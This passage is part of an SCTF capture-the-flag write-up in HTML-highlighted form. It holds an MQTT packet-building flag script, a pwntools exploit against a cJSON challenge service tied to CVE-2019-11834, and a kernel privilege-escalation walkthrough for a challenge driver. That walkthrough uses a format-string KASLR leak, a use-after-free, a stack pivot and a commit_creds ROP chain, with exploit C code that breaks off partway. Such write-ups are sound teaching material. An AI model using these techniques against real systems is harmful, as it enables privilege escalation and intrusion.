</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>endian</span> <span class=o>=</span> <span class=s1>&#39;big&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>client_id</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;21&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>user</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;chengdu106520013&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>datalen</span> <span class=o>=</span> <span class=mi>10</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>client_id</span><span class=p>)</span> <span class=o>+</span> <span class=mi>2</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>user</span><span class=p>)</span> <span class=o>+</span> <span class=mi>2</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>password</span><span class=p>)</span> <span class=o>+</span> <span class=mi>2</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x10</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>datalen</span><span class=p>,</span> <span class=mi>4</span><span class=p>])</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;MQTT&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x04</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xc2\x00\x50</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>client_id</span><span class=p>))</span> <span class=o>+</span> <span class=n>client_id</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>user</span><span class=p>))</span> <span class=o>+</span> <span class=n>user</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>password</span><span class=p>))</span> <span class=o>+</span> <span class=n>password</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pkt</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>hexlify</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>reorder</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>12</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>pkt</span><span class=p>),</span> <span class=mi>12</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>reorder</span> <span class=o>+=</span> <span class=n>pkt</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;sctf{&#39;</span> <span class=o>+</span> <span class=n>reorder</span> <span class=o>+</span> <span class=s1>&#39;}&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=pwn>Pwn</h1><h3 id=dataleak>dataleak</h3><p>CVE-2019-11834 ç›´æ¥æ³„éœ²å³å¯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># sh = process(&#39;./cJSON_PWN&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;124.70.202.226&#39;</span><span class=p>,</span><span class=mi>2101</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># gdb.attach(sh,&#39;b * $rebase(0x120d)&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;/*&#34;</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mh>0xe</span><span class=p>,</span><span class=s1>&#39;b&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload = payload.ljust(0xe,&#39;a&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;aaaa/*&#34;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xe</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;b&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0xb</span><span class=o>-</span><span class=mi>6</span><span class=p>)</span> <span class=o>+</span><span class=s2>&#34;/*&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xe</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;/*&#34;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xe</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=flyingkernel>flyingkernel</h3><p>This was the only kernel challenge for SCTF this year.</p><p>The vulnerable device driver was /dev/seven.</p><p>They were multiple vulnerabilities that when combined can lead to LPE.</p><p>You can allocate a chunk of size 0x80 using the command <code>0x5555</code> in ioctl.</p><p>Using the command <code>0x6666</code> you can get that chunk freed but not nulled (UAF).</p><p>The last ioclt command was <code>0x7777</code> we can use this to get format string attack and bypass KASLR.</p><p>And the most important thing is that SMAP is disabled, which means if we can get our leaks using</p><p>the format string attack and then get RIP, we can pivot our stack and just ROP ; commit_creds(prepare_kernel_cred(0)) and swapgs iretq.</p><p>So now we have UAF on a chunk with size 0x80, which means it will get the chunk from kmalloc-128</p><p>The problem is that there are not much structs we can target for this specific slab.</p><p>But good for use there is <code>struct subprocess_info</code> which can give RIP control.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>struct</span> <span class=n>subprocess_info</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>struct</span> <span class=n>work_struct</span> <span class=n>work</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>struct</span> <span class=n>completion</span> <span class=o>*</span><span class=n>complete</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>const</span> <span class=n>char</span> <span class=o>*</span><span class=n>path</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=ne>int</span> <span class=n>wait</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=ne>int</span> <span class=n>retval</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=ne>int</span> <span class=p>(</span><span class=o>*</span><span class=n>init</span><span class=p>)(</span><span class=n>struct</span> <span class=n>subprocess_info</span> <span class=o>*</span><span class=n>info</span><span class=p>,</span> <span class=n>struct</span> <span class=n>cred</span> <span class=o>*</span><span class=n>new</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>void</span> <span class=p>(</span><span class=o>*</span><span class=n>cleanup</span><span class=p>)(</span><span class=n>struct</span> <span class=n>subprocess_info</span> <span class=o>*</span><span class=n>info</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>void</span> <span class=o>*</span><span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>__randomize_layout</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>if we can control <code>cleanup</code> we can control rip (but we have to be quick, this struct is allocated and it uses cleanup quickly).</p><p>You can allocate this struct just using this line of code : socket(22, AF_INET, 0); itâ€™s okey if it fails and return -1 it will still be allocated.</p><p>So the plan is this:</p><ul><li><p>Take advantage of the format string vuln to get leaks (donâ€™t use %p they are detected by the kernel as information leak and it will show up as <em><strong>ptr</strong></em> and not the actual value in my exploit I provided %lld) and now we have the kernel base.</p></li><li><p>Free that chunk and execute that socket() to get advantage of the UAF and overwrite cleanup with a gadget, in my case it was</p></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Apache data-lang=Apache><span class=line><span class=cl><span class=err>0xffffffff816e19bc:</span>        <span class=nb>mov</span>    esp,0x83000000
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>0xffffffff816e19c1:</span>        <span class=nb>ret</span>
</span></span></code></pre></td></tr></table></div></div><ul><li><p>I mentioned that we should be quick to overwrite that (so that our gadget gets executed and not the actual cleanup value). userfault_fd was not available to make the race reliable. What I did was I spawned a thread which write to /dev/seven in infinite loop, and hope for cleanup to be overwritten before use.</p></li><li><p>mmap that region of memory and put our ROP there, elevate our privs and execute shell.</p></li></ul><p>The complete exploit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span><span class=lnt>357
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/syscall.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/ioctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/socket.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;pthread.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// We can launch ioctl / read / write for this device driver.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// For ioctl command we have:
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 0x6666 for UAF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 0x7777 for Fmt string vuln
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 0x5555 alloc of size 0x80
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=cp>#define ALLOC         0x5555
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define UAF                0x6666
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define GET                0x7777
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>trap_frame</span><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>char</span><span class=o>*</span> <span class=n>rip</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>cs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>rflags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>char</span><span class=o>*</span> <span class=n>rsp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>ss</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=nf>__attribute__</span><span class=p>((</span><span class=n>packed</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>trap_frame</span> <span class=n>tf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>save_state</span><span class=p>(</span><span class=kt>void</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>asm</span> <span class=k>volatile</span><span class=p>(</span>   <span class=s>&#34;mov tf+8, cs;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=s>&#34;pushf;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=s>&#34;pop tf+16;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=s>&#34;mov tf+24, rsp;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=s>&#34;mov tf+32, ss;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>open_target</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/seven&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>assert</span><span class=p>(</span><span class=n>fd</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>lock</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=nf>memset_buf</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>tmp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>buf</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
